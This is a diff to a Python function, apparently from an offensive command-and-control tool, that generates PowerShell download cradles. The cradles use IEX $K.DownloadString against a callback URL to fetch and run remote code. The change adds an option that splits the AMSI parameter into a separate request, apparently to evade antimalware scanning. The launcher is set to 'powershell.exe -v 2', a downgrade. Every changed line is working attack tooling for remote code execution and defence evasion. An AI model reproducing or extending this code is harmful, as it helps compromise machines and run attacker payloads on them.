@@ -135,12 +135,21 @@ def build_cradle(get_args):
             clip_exec = "&c=%s" % get_args['ClipExec']
         else:
             clip_exec = ""
-        result += "IEX $K.DownloadString('%s0?t=%s&a=%s%s');"
-        result = result % (
-            callback_urls[get_args['Transport']],
-            get_args['Transport'],
-            get_args['Amsi'],
-            clip_exec,
+        if get_args['SeparateAMSI'] == 'true':
+            result += (
+                "'a=%(amsi)s','t=%(transport)s'|%%"
+                "{IEX $K.DownloadString('%(url)s0?'+$_)}"
+            )
+        else:
+            result += (
+                "IEX $K.DownloadString('%(url)s0?t=%(transport)s&a=%(amsi)"
+                "s%(clip)s')"
+            )
+        result = result % dict(
+            url=callback_urls[get_args['Transport']],
+            transport=get_args['Transport'],
+            amsi=get_args['Amsi'],
+            clip=clip_exec,
         )
 
     powershell_exe = 'powershell.exe -v 2'
